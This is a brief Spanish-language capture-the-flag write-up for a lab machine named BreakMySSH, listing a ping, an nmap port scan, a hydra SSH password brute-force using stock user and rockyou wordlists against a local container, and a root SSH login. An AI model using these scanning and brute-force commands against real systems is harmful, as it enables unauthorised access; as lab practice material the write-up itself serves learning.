Maquina: BreakMySSH

Autor: El Pinguino de Mario 

Dificultad: Muy Facil

![Screenshot 2024-11-09 085848](https://github.com/user-attachments/assets/4ff00858-dc5a-4f7a-be46-5fdc7ec2e371)

ping 172.17.0.2 -c 1

![Screenshot 2024-11-09 085907](https://github.com/user-attachments/assets/ae993390-bc0c-4de9-a6ee-c27b713cacd5)

nmap -p- --open -sT --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts

![Screenshot 2024-11-09 085924](https://github.com/user-attachments/assets/236f9ecd-db5a-4a22-89e3-c77f66ec8b03)

sudo hydra -L /usr/share/metasploit-framework/data/wordlists/unix_users.txt -P /usr/share/wordlists/rockyou.txt.gz ssh://172.17.0.2 -t 10 -I

![Screenshot 2024-11-09 090043](https://github.com/user-attachments/assets/ccc6482c-6df9-4e14-a825-92386b112bf1)

ssh root@172.17.0.2

whoami

![Screenshot 2024-11-09 090137](https://github.com/user-attachments/assets/3becc565-b799-485c-a6a4-7c3a28ed62da)
